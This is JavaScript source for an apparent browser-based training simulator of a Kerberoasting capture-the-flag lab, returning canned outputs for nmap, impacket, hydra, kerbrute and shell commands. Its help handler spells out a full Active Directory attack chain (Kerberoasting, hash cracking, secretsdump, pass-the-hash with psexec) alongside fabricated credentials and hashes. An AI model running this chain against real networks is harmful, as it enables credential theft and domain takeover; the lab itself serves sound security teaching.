      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: '[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d', cls: 'b' },
      { t: '[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)', cls: 'b' },
      { t: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::', cls: 'g' },
      { t: 'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' },
      { t: '' },
      { t: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', cls: 'b' },
      { t: '[*] Using the DRSUAPI method to get NTDS.DIT secrets', cls: 'b' },
      { t: 'CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::', cls: 'g' },
      { t: 'CORP\\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' },
      { t: 'CORP\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c:::' },
      { t: 'CORP\\john.doe:1103:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' },
      { t: 'CORP\\svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5:::', cls: 'g' },
      { t: 'CORP\\svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:f4c5e53a5e66f1c6e1c6d57f6eac2f5a:::' },
      { t: 'CORP\\svc_web:1106:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::' },
      { t: '' },
      { t: '[*] Kerberos keys grabbed', cls: 'b' },
      { t: 'CORP\\Administrator:aes256-cts-hmac-sha1-96:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4' },
      { t: '' },
      { t: '[*] Cleaning up...', cls: 'd' },
    ],
  },

  // ── psexec ────────────────────────────────────────────────────────────────
  {
    id: 'psexec',
    loadTime: 4500,
    match: c => /impacket-psexec|psexec\.py/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: '[*] Requesting shares on 10.10.10.10.....', cls: 'b' },
      { t: '[*] Found writable share ADMIN$', cls: 'g' },
      { t: '[*] Uploading file XGaHpFZv.exe', cls: 'b' },
      { t: '[*] Opening SVCManager on 10.10.10.10.....', cls: 'b' },
      { t: '[*] Creating service oUUL on 10.10.10.10.....', cls: 'b' },
      { t: '[*] Starting service oUUL.....', cls: 'b' },
      { t: '[!] Press help for extra shell commands', cls: 'y' },
      { t: 'Microsoft Windows [Version 10.0.17763.4737]', cls: 'w' },
      { t: '(c) 2018 Microsoft Corporation. All rights reserved.', cls: 'd' },
      { t: '' },
      { t: 'C:\\Windows\\system32> whoami', cls: 'p' },
      { t: 'nt authority\\system', cls: 'g' },
      { t: '' },
      { t: 'C:\\Windows\\system32> ', cls: 'p' },
    ],
    after: () => { SIM.windowsShell = true; },
  },

  // ── gobuster / dirb ───────────────────────────────────────────────────────
  {
    loadTime: 2500,
    match: c => /^gobuster\b|^dirb\b|^dirsearch\b/.test(c),
    lines: [
      { t: 'Gobuster v3.6', cls: 'b' },
      { t: 'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)', cls: 'd' },
      { t: '' },
      { t: 'Initializing scan...' },
      { t: '/index.html           (Status: 200) [Size: 1245]', cls: 'g' },
      { t: '/images               (Status: 301) [Size: 166]', cls: 'g' },
      { t: '/admin                (Status: 403) [Size: 291]', cls: 'y' },
      { t: '' },
      { t: 'Finished', cls: 'g' },
    ],
  },

  // ── rpcclient ─────────────────────────────────────────────────────────────
  {
    loadTime: 1200,
    match: c => /^rpcclient\b/.test(c),
    lines: [
      { t: 'rpcclient $> enumdomusers', cls: 'd' },
      { t: 'user:[Administrator] rid:[0x1f4]' },
      { t: 'user:[john.doe] rid:[0x44f]' },
      { t: 'user:[svc_backup] rid:[0x450]' },
      { t: 'user:[svc_sql] rid:[0x451]' },
      { t: 'user:[svc_web] rid:[0x452]' },
      { t: 'rpcclient $> quit', cls: 'd' },
    ],
  },

  // ── smbclient ─────────────────────────────────────────────────────────────
  {
    loadTime: 1200,
    match: c => /^smbclient\b/.test(c),
    lines: [
      { t: 'Password for [WORKGROUP\\root]:' },
      { t: '' },
      { t: '\tSharename       Type      Comment' },
      { t: '\t---------       ----      -------' },
      { t: '\tSYSVOL          Disk      Logon server share', cls: 'b' },
      { t: '\tNETLOGON        Disk      Logon server share', cls: 'b' },
      { t: '\tIPC$            IPC       Remote IPC', cls: 'd' },
      { t: 'Reconnecting with SMB1 for workgroup listing.' },
    ],
  },

  // ── kerbrute ─────────────────────────────────────────────────────────────
  {
    loadTime: 2800,
    match: c => /^kerbrute\b/.test(c),
    lines: [
      { t: '    __             __               __', cls: 'p' },
      { t: '   / /_____  _____/ /_  _______  __/ /____', cls: 'p' },
      { t: '  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\', cls: 'p' },
      { t: ' / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/', cls: 'p' },
      { t: '/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/', cls: 'p' },
      { t: '' },
      { t: 'Version: v1.0.3 (9dad6e1) - 01/15/24 - Ronnie Flathers @ropnop', cls: 'd' },
      { t: '' },
      { t: '2024/01/15 14:05:31 >  Using KDC(s):', cls: 'b' },
      { t: '2024/01/15 14:05:31 >  10.10.10.10:88', cls: 'b' },
      { t: '' },
      { t: '2024/01/15 14:05:32 >  [+] VALID USERNAME: Administrator@CORP.LOCAL', cls: 'g' },
      { t: '2024/01/15 14:05:32 >  [+] VALID USERNAME: john.doe@CORP.LOCAL', cls: 'g' },
      { t: '2024/01/15 14:05:32 >  [+] VALID USERNAME: svc_backup@CORP.LOCAL', cls: 'g' },
      { t: '2024/01/15 14:05:33 >  Done! Tested 100 usernames, 3 valid', cls: 'g' },
    ],
  },

  // ── hydra ─────────────────────────────────────────────────────────────────
  {
    loadTime: 3500,
    match: c => /^hydra\b/.test(c),
    lines: [
      { t: 'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak' },
      { t: '' },
      { t: 'Hydra (https://github.com/vanhauser-thc/thc-hydra) starting...', cls: 'b' },
      { t: '[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries' },
      { t: '[DATA] attacking smb://10.10.10.10:445/' },
      { t: '[445][smb] host: 10.10.10.10   login: john.doe   password: Password1!', cls: 'g' },
      { t: '1 of 1 target successfully completed, 1 valid password found', cls: 'g' },
    ],
  },

  // ── ps ────────────────────────────────────────────────────────────────────
  {
    match: c => /^ps(\s|$)/.test(c),
    lines: [{ t: c => {
      const isAux = c.includes('aux') || c.includes('-aux') || c.includes('a');
      if (isAux) return [
        'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
        'root           1  0.0  0.2 168796 13132 ?        Ss   12:09   0:02 /sbin/init',
        'root           2  0.0  0.0      0     0 ?        S    12:09   0:00 [kthreadd]',
        'root         432  0.7  0.3 545928 24568 ?        Ssl  12:09   0:03 /usr/sbin/NetworkManager --no-daemon',
        'root         591  0.0  0.1  12312  7712 ?        Ss   12:09   0:00 sshd: /usr/sbin/sshd -D',
        'root         623  0.0  0.0  11688  3560 ?        Ss   12:09   0:00 /usr/sbin/cron -f',
        'kali         891  0.0  0.6 231420 52400 tty7     Ss+  12:10   0:01 /usr/bin/Xorg :0 -seat seat0',
        'kali        1189  0.0  0.9 456748 78432 ?        Ss   12:10   0:02 xfce4-session',
        `${SIM.user.padEnd(12)} 1234  0.0  0.1  11936  5192 pts/0    Ss   12:10   0:00 bash`,
        `${SIM.user.padEnd(12)} 1338  0.0  0.0  12240  3512 pts/0    R+   14:23   0:00 ps aux`,
      ].join('\n');
      return [
        '    PID TTY          TIME CMD',
        `   1234 pts/0    00:00:00 bash`,
        `   1338 pts/0    00:00:00 ps`,
      ].join('\n');
    }}],
  },

  // ── ss / netstat ─────────────────────────────────────────────────────────
  {
    match: c => /^(ss|netstat)(\s|$)/.test(c),
    lines: [
      { t: 'Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port' },
      { t: 'tcp    LISTEN  0       128     0.0.0.0:22         0.0.0.0:*', cls: 'g' },
      { t: 'tcp    LISTEN  0       128     127.0.0.1:631      0.0.0.0:*' },
      { t: 'tcp    ESTAB   0       0       10.10.10.5:51234   10.10.10.10:445', cls: 'b' },
    ],
  },

  // ── sudo -l (called by _runSudoCmd after auth) ────────────────────────────
  {
    match: c => c === '-l',
    lines: [
      { t: 'Matching Defaults entries for kali on kali:' },
      { t: '    env_reset, mail_badpass,' },
      { t: '    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
      { t: '' },
      { t: 'User kali may run the following commands on kali:', cls: 'g' },
      { t: '    (ALL : ALL) ALL', cls: 'g' },
    ],
  },

  // ── which ────────────────────────────────────────────────────────────────
  {
    match: c => /^which\s/.test(c),
    lines: [{ t: (c) => {
      const tool = c.replace(/^which\s+/, '').trim();
      const paths = {
        nmap: '/usr/bin/nmap', python3: '/usr/bin/python3', python: '/usr/bin/python3',
        bash: '/usr/bin/bash', sh: '/usr/bin/sh', john: '/usr/sbin/john',
        hashcat: '/usr/bin/hashcat', curl: '/usr/bin/curl', wget: '/usr/bin/wget',
        ssh: '/usr/bin/ssh', nc: '/usr/bin/nc', netcat: '/usr/bin/nc',
        'impacket-GetUserSPNs': '/usr/bin/impacket-GetUserSPNs',
        'impacket-secretsdump': '/usr/bin/impacket-secretsdump',
        'impacket-psexec': '/usr/bin/impacket-psexec',
        crackmapexec: '/usr/bin/crackmapexec', enum4linux: '/usr/bin/enum4linux',
        hydra: '/usr/bin/hydra', gobuster: '/usr/bin/gobuster',
        kerbrute: '/opt/kerbrute/kerbrute',
        top: '/usr/bin/top', htop: '/usr/bin/htop',
        df: '/usr/bin/df', free: '/usr/bin/free',
        ifconfig: '/usr/sbin/ifconfig', ip: '/usr/sbin/ip',
        ps: '/usr/bin/ps', ss: '/usr/bin/ss', arp: '/usr/sbin/arp',
      };
      return paths[tool] || `${tool} not found`;
    }, cls: (c) => {
      const tool = c.replace(/^which\s+/, '').trim();
      return ['nmap','john','hashcat','curl','wget','ssh','python3','bash','crackmapexec','enum4linux'].includes(tool) ? 'g' : 'r';
    }}],
  },

  // ── find ─────────────────────────────────────────────────────────────────
  {
    match: c => /^find\s/.test(c),
    lines: [{ t: (c) => {
      if (c.includes('.kerberoast') || c.includes('hash')) return SIM.hashesOnDisk ? '/home/kali/hashes.kerberoast' : '';
      if (c.includes('wordlist') || c.includes('rockyou')) return '/usr/share/wordlists/rockyou.txt';
      if (c.includes('txt')) return '/home/kali/notes.txt\n/etc/hosts\n/etc/os-release';
      return '';
    }}],
  },

  // ── grep ─────────────────────────────────────────────────────────────────
  {
    match: c => /^grep\s/.test(c),
    lines: [{ t: (c) => {
      if (c.includes('root') && c.includes('passwd')) return 'root:x:0:0:root:/root:/bin/bash';
      if (c.includes('kali') && c.includes('passwd')) return 'kali:x:1000:1000:Kali,,,:/home/kali:/bin/bash';
      if (c.includes('svc') || c.includes('service')) return 'svc_backup:Backup2023!\nsvc_sql:SqlServer1!\nsvc_web:Welcome123';
      return '';
    }, cls: 'g'}],
  },

  // ── python3 ───────────────────────────────────────────────────────────────
  {
    match: c => /^python3?(\s|$)/.test(c),
    lines: [{ t: (c) => {
      if (c.includes('--version') || c.includes('-V')) return 'Python 3.11.6';
      if (c.includes('-c')) return '';
      return 'Python 3.11.6 (main, Oct 2 2023, 20:46:14) [GCC 13.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> (simulation — interactive mode not supported)';
    }}],
  },

  // ── curl / wget ───────────────────────────────────────────────────────────
  {
    match: c => /^curl\s/.test(c),
    lines: [{ t: (c) => {
      if (c.includes('10.10.10.10') || c.includes('dc01')) return '<!DOCTYPE html>\n<html><head><title>IIS Windows Server</title></head><body><h1>IIS</h1></body></html>';
      return 'curl: (6) Could not resolve host: ' + c.split(' ').pop();
    }}],
  },
  {
    match: c => /^wget\s/.test(c),
    lines: [
      { t: (c) => `--2024-01-15 14:23:01--  ${c.split(' ').pop()}` },
      { t: 'Connecting to... connected.' },
      { t: 'HTTP request sent, awaiting response... 200 OK' },
      { t: 'Length: 4096 (4.0K)' },
      { t: 'Saving to: output_file' },
      { t: '2024-01-15 14:23:02 (4.00 MB/s) — output_file saved [4096/4096]', cls: 'g' },
    ],
  },

  // ── ssh ───────────────────────────────────────────────────────────────────
  {
    match: c => /^ssh\s/.test(c),
    lines: [
      { t: (c) => {
        const host = c.split(' ').pop();
        return `ssh: connect to host ${host} port 22: Connection refused`;
      }, cls: 'r' },
    ],
  },

  // ── nc / netcat ───────────────────────────────────────────────────────────
  {
    match: c => /^(nc|netcat)\s/.test(c),
    lines: [{ t: '(simulation — nc not interactive)', cls: 'd' }],
  },

  // ── nano / vim / vi ───────────────────────────────────────────────────────
  {
    match: c => /^(nano|vim?|gedit|emacs|micro)\b/.test(c),
    lines: [{ t: (c) => `${c.split(' ')[0]}: interactive editors not supported in this simulation`, cls: 'y' }],
  },

  // ── service / systemctl ───────────────────────────────────────────────────
  {
    match: c => /^(service|systemctl)\s/.test(c),
    lines: [{ t: (c) => {
      if (c.includes('status')) return '● ssh.service - OpenBSD Secure Shell server\n   Loaded: loaded (/lib/systemd/system/ssh.service)\n   Active: active (running) since Mon 2024-01-15 12:10:03 EST; 2h 13min ago\n Main PID: 591 (sshd)\n   CGroup: /system.slice/ssh.service\n           └─591 sshd: /usr/sbin/sshd -D';
      if (c.includes('start') || c.includes('restart')) return '';
      return '';
    }}],
  },

  // ── top ───────────────────────────────────────────────────────────────────
  {
    match: c => c === 'top' || /^top\s/.test(c),
    loadTime: 600,
    lines: [{ t: () => {
      const t = new Date();
      const hms = `${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
      return [
        `top - ${hms} up 2:13,  1 user,  load average: 0.15, 0.22, 0.18`,
        'Tasks: 142 total,   1 running, 141 sleeping,   0 stopped,   0 zombie',
        '%Cpu(s):  2.3 us,  0.8 sy,  0.0 ni, 96.7 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st',
        'MiB Mem :   8192.0 total,   4231.5 free,   2847.3 used,   1113.2 buff/cache',
        'MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   5061.0 avail Mem',
        '',
        '    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND',
        '    432 root      20   0  545928  24568  18844 S   0.7   0.3   0:03.21 NetworkManager',
        '   1234 kali      20   0   11936   5192   3824 S   0.3   0.1   0:00.44 bash',
        '      1 root      20   0  168796  13132   8392 S   0.0   0.2   0:02.14 systemd',
        '      2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 kthreadd',
        '    591 root      20   0   12312   7712   6448 S   0.0   0.1   0:00.08 sshd',
        '    623 root      20   0   11688   3560   3284 S   0.0   0.0   0:00.01 cron',
        '    891 kali      20   0  231420  52400  38100 S   0.0   0.6   0:01.23 Xorg',
        '   1189 kali      20   0  456748  78432  59200 S   0.0   0.9   0:02.11 xfce4-session',
        '   1337 kali      20   0   14240   3864   3188 R   0.0   0.0   0:00.01 top',
        '',
        '[batch snapshot — press q or Ctrl+C to exit in a real terminal]',
      ].join('\n');
    }}],
  },

  // ── htop ─────────────────────────────────────────────────────────────────
  {
    match: c => c === 'htop' || /^htop\s/.test(c),
    loadTime: 600,
    lines: [{ t: () => {
      const t = new Date();
      const hms = `${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
      return [
        '  CPU[|||||||||                                      18.5%]   Tasks: 142, 456 thr; 1 running',
        '  Mem[||||||||||||||||||||                        2847M/8192M]   Load average: 0.15 0.22 0.18',
        '  Swp[                                              0K/2048M]   Uptime: 02:13:07',
        '',
        '  PID USER       PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command',
        '  432 root        20   0  533M 24568 18844 S  0.7  0.3  0:03.21 NetworkManager',
        ' 1234 kali        20   0 11936  5192  3824 S  0.3  0.1  0:00.44 bash',
        `    1 root        20   0  165M 13132  8392 S  0.0  0.2  0:02.14 /sbin/init`,
        '  591 root        20   0 12312  7712  6448 S  0.0  0.1  0:00.08 sshd',
        '  891 kali        20   0  226M 52400 38100 S  0.0  0.6  0:01.23 Xorg',
        ' 1189 kali        20   0  446M 78432 59200 S  0.0  0.9  0:02.11 xfce4-session',
        ` 1338 kali        20   0 14240  3864  3188 R  0.0  0.0  0:00.01 htop`,
        '',
        `[batch snapshot — ${hms}]`,
      ].join('\n');
    }}],
  },

  // ── df ────────────────────────────────────────────────────────────────────
  {
    match: c => /^df(\s|$)/.test(c),
    lines: [
      { t: 'Filesystem      Size  Used Avail Use% Mounted on' },
      { t: '/dev/sda1        50G   18G   30G  38% /', cls: 'g' },
      { t: 'tmpfs           4.0G     0  4.0G   0% /dev/shm' },
      { t: 'tmpfs           1.6G  1.2M  1.6G   1% /run' },
      { t: '/dev/sda2       200G   45G  145G  24% /home', cls: 'g' },
      { t: 'tmpfs           100M   20K  100M   1% /run/user/1000' },
    ],
  },

  // ── free ─────────────────────────────────────────────────────────────────
  {
    match: c => /^free(\s|$)/.test(c),
    lines: [
      { t: '               total        used        free      shared  buff/cache   available' },
      { t: 'Mem:         8388608     2914048     4325632       13312     1148928     5178208', cls: 'b' },
      { t: 'Swap:        2097152           0     2097152', cls: 'd' },
    ],
  },

  // ── ifconfig / ip addr / ip a ─────────────────────────────────────────────
  {
    match: c => c === 'ifconfig' || c === 'ifconfig -a' || /^ip\s+(addr|a|address|link)/.test(c),
    lines: [
      { t: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500', cls: 'b' },
      { t: '        inet 10.10.10.5  netmask 255.255.255.0  broadcast 10.10.10.255' },
      { t: '        inet6 fe80::250:56ff:fe8d:4ab3  prefixlen 64  scopeid 0x20<link>' },
      { t: '        ether 00:50:56:8d:4a:b3  txqueuelen 1000  (Ethernet)' },
      { t: '        RX packets 84231  bytes 12445920 (11.8 MiB)' },
      { t: '        TX packets 52134  bytes 8923410 (8.5 MiB)' },
      { t: '' },
      { t: 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536', cls: 'b' },
      { t: '        inet 127.0.0.1  netmask 255.0.0.0' },
      { t: '        inet6 ::1  prefixlen 128  scopeid 0x10<host>' },
      { t: '        loop  txqueuelen 1000  (Local Loopback)' },
    ],
  },

  // ── ip route ─────────────────────────────────────────────────────────────
  {
    match: c => /^ip\s+r(oute)?/.test(c) || c === 'route -n' || c === 'route',
    lines: [
      { t: 'default via 10.10.10.1 dev eth0 proto dhcp metric 100', cls: 'g' },
      { t: '10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.5 metric 100' },
      { t: '127.0.0.0/8 dev lo proto kernel scope link src 127.0.0.1' },
    ],
  },

  // ── arp ───────────────────────────────────────────────────────────────────
  {
    match: c => /^arp(\s|$)/.test(c),
    lines: [
      { t: 'Address                  HWtype  HWaddress           Flags Mask    Iface' },
      { t: '10.10.10.1               ether   00:50:56:c0:00:08   C             eth0' },
      { t: '10.10.10.10              ether   00:0c:29:3a:bc:de   C             eth0', cls: 'g' },
    ],
  },

  // ── echo ─────────────────────────────────────────────────────────────────
  {
    match: c => /^echo(\s|$)/.test(c),
    lines: [{ t: c => c.replace(/^echo\s*/, '').replace(/^(['"])(.*)\1$/, '$2') }],
  },

  // ── lsb_release ──────────────────────────────────────────────────────────
  {
    match: c => /^lsb_release/.test(c),
    lines: [
      { t: 'Distributor ID:\tKali' },
      { t: 'Description:\tKali GNU/Linux Rolling' },
      { t: 'Release:\t2024.2' },
      { t: 'Codename:\tkali-rolling' },
    ],
  },

  // ── w / who ──────────────────────────────────────────────────────────────
  {
    match: c => c === 'w' || c === 'who' || c === 'who -a',
    lines: [{ t: () => {
      const t = new Date();
      const hms = `${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
      return ` ${hms} up 2:13,  1 user,  load average: 0.15, 0.22, 0.18\nUSER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n${SIM.user}     pts/0    10.10.10.1       12:10    0.00s  0.08s  0.00s w`;
    }}],
  },

  // ── last ─────────────────────────────────────────────────────────────────
  {
    match: c => /^last(\s|$)/.test(c),
    lines: [
      { t: () => `${SIM.user.padEnd(8)} pts/0        10.10.10.1       Mon Jan 15 12:10   still logged in` },
      { t: 'reboot   system boot  6.6.9-amd64      Mon Jan 15 12:09   still running' },
      { t: '' },
      { t: 'wtmp begins Mon Jan 15 12:09:02 2024', cls: 'd' },
    ],
  },

  // ── mkdir / touch / rm / cp / mv ─────────────────────────────────────────
  {
    match: c => /^(mkdir|touch|rm|cp|mv)\s/.test(c),
    lines: [{ t: c => {
      const op = c.split(' ')[0];
      if (op === 'rm' && c.includes('-rf') && (c.includes('/') && c.split(' ').pop() === '/'))
        return 'rm: it is dangerous to operate recursively on \'/\'';
      return '';   // silent success
    }}],
  },

  // ── cat /proc entries ─────────────────────────────────────────────────────
  {
    match: c => c === 'cat /proc/version',
    lines: [{ t: 'Linux version 6.6.9-amd64 (debian-kernel@lists.debian.org) (gcc-13 (Debian 13.2.0-13) 13.2.0, GNU ld (GNU Binutils for Debian) 2.41) #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08)' }],
  },
  {
    match: c => c === 'cat /proc/cpuinfo' || c === 'cat /proc/cpuinfo | head -20',
    lines: [
      { t: 'processor\t: 0' },
      { t: 'vendor_id\t: GenuineIntel' },
      { t: 'cpu family\t: 6' },
      { t: 'model name\t: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz' },
      { t: 'cpu MHz\t\t: 3799.998' },
      { t: 'cache size\t: 16384 KB' },
      { t: 'physical id\t: 0' },
      { t: 'cpu cores\t: 4' },
      { t: 'flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc' },
    ],
  },

  // ── Windows shell extras ──────────────────────────────────────────────────

  // ── Help / misc ───────────────────────────────────────────────────────────
  {
    match: c => c === 'help' || c === 'help --ctf',
    lines: [
      { t: '┌─────────────────────────────────────────────────────┐', cls: 'p' },
      { t: '│         Kerberoasting CTF Lab — Quick Reference       │', cls: 'p' },
      { t: '└─────────────────────────────────────────────────────┘', cls: 'p' },
      { t: '' },
      { t: 'STEP 1  sudo nmap -sn 10.10.10.0/24', cls: 'c' },
      { t: 'STEP 2  sudo nmap -sV -sC -p- 10.10.10.10', cls: 'c' },
      { t: 'STEP 3  enum4linux -a 10.10.10.10', cls: 'c' },
      { t: 'STEP 4  cat /home/kali/notes.txt', cls: 'c' },
      { t: '        crackmapexec smb 10.10.10.10 -u john.doe -p \'Password1!\'', cls: 'c' },
      { t: 'STEP 5  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10', cls: 'c' },
      { t: 'STEP 6  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast', cls: 'c' },
      { t: 'STEP 7  john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt', cls: 'c' },
      { t: '        john hashes.kerberoast --show', cls: 'c' },
      { t: 'STEP 8  crackmapexec smb 10.10.10.10 -u svc_backup -p \'Backup2023!\'', cls: 'c' },
      { t: 'STEP 9  impacket-secretsdump CORP.LOCAL/svc_backup:\'Backup2023!\'@10.10.10.10', cls: 'c' },
      { t: 'STEP 10 crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889', cls: 'c' },
      { t: '        impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10', cls: 'c' },
      { t: '' },
      { t: 'Type  help  again to see this menu. See WALKTHROUGH.md for full explanations.', cls: 'd' },
    ],
  },

];

// ── Dispatcher ────────────────────────────────────────────────────────────────
function runCommand(rawInput) {
  const cmd = rawInput.trim().replace(/\s+/g, ' ');
  if (!cmd) return null;

  // Windows shell mode (after psexec)
  if (SIM.windowsShell) {
    if (cmd === 'exit') { SIM.windowsShell = false; return { lines: [{ t: '' }] }; }
    if (cmd === 'whoami') return { lines: [{ t: 'nt authority\\system', cls: 'g' }] };
    if (cmd === 'whoami /priv') return { lines: [
      { t: 'PRIVILEGES INFORMATION' }, { t: '----------------------' }, { t: '' },
      { t: 'Privilege Name                  Description                         State', cls: 'b' },
      { t: '=============================== =================================== =======', cls: 'd' },
      { t: 'SeAssignPrimaryTokenPrivilege   Replace a process level token       Enabled', cls: 'g' },
      { t: 'SeTcbPrivilege                  Act as part of the operating system Enabled', cls: 'g' },
      { t: 'SeDebugPrivilege                Debug programs                      Enabled', cls: 'g' },
      { t: 'SeImpersonatePrivilege          Impersonate a client after auth     Enabled', cls: 'g' },
    ]};
    if (cmd === 'hostname') return { lines: [{ t: 'DC01' }] };
    if (cmd === 'ipconfig' || cmd === 'ipconfig /all') return { lines: [
      { t: 'Windows IP Configuration' }, { t: '' },
      { t: 'Ethernet adapter Ethernet0:', cls: 'b' },
      { t: '   Connection-specific DNS Suffix  . : corp.local' },
      { t: '   IPv4 Address. . . . . . . . . . . : 10.10.10.10' },
      { t: '   Subnet Mask . . . . . . . . . . . : 255.255.255.0' },
      { t: '   Default Gateway . . . . . . . . . : 10.10.10.1' },
    ]};
    if (/^net user/.test(cmd)) return { lines: [
      { t: 'User accounts for \\\\DC01', cls: 'b' },
      { t: '-------------------------------------------------------------------------------' },
      { t: 'Administrator            Guest                    krbtgt' },
      { t: 'john.doe                 svc_backup               svc_sql                svc_web' },
    ]};
    if (/^net localgroup/.test(cmd)) return { lines: [
      { t: 'Aliases for \\\\DC01', cls: 'b' },
      { t: '-------------------------------------------------------------------------------' },
      { t: '*Administrators          *Backup Operators        *Domain Admins' },
      { t: '*Domain Users            *Remote Desktop Users' },
    ]};
    if (cmd.startsWith('dir')) return { lines: [
      { t: ' Volume in drive C has no label.' },
      { t: ' Directory of C:\\Windows\\system32' }, { t: '' },
      { t: '01/15/2024  02:23 PM    <DIR>          .' },
      { t: '01/15/2024  02:23 PM    <DIR>          ..' },
      { t: '01/15/2024  02:23 PM    <DIR>          config' },
      { t: '01/15/2024  02:23 PM        32,768     cmd.exe' },
    ]};
    if (cmd === 'cls') return { clear: true };
    return { lines: [{ t: `'${cmd.split(' ')[0]}' is not recognized as an internal or external command.`, cls: 'r' }] };
  }

  if (cmd === 'clear') return { clear: true };
  if (cmd === 'exit' || cmd === 'logout') return { lines: [{ t: 'Type exit in your browser to close the tab.', cls: 'd' }] };

  // Walk handlers in order, first match wins
  for (const h of HANDLERS) {
    if (h.match(cmd)) {
      if (h.waitSudo) {
        return { waitSudo: true, pendingCmd: cmd.replace(/^sudo\s*/, '') };
      }
      if (h.requireRoot && !isRoot()) {
        return { lines: [{ t: `E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock, are you root?\nHint: try  sudo ${cmd}`, cls: 'r' }] };
      }
      if (h.after) h.after(cmd);
      const event = typeof h.event === 'function' ? h.event(cmd) : h.event;
      const lines = h.lines.map(l => ({
        t: typeof l.t === 'function' ? l.t(cmd) : l.t,
        cls: typeof l.cls === 'function' ? l.cls(cmd) : (l.cls || ''),
      }));
      return { id: h.id || null, lines, event, loadTime: h.loadTime || 0, progressFn: h.progressFn || null };
    }
  }

  // Unknown command
  const tool = cmd.split(' ')[0];
  const knownTools = ['nmap','enum4linux','crackmapexec','cme','impacket','john','hashcat',
    'hydra','kerbrute','gobuster','rpcclient','smbclient','metasploit','msfconsole','wpscan','nikto'];
  if (knownTools.some(t => tool.includes(t))) {
    return { lines: [{ t: `${tool}: unrecognized options or target. Check syntax — type  help  for the CTF steps.`, cls: 'r' }] };
  }
  return { lines: [{ t: `bash: ${tool}: command not found`, cls: 'r' }] };
}
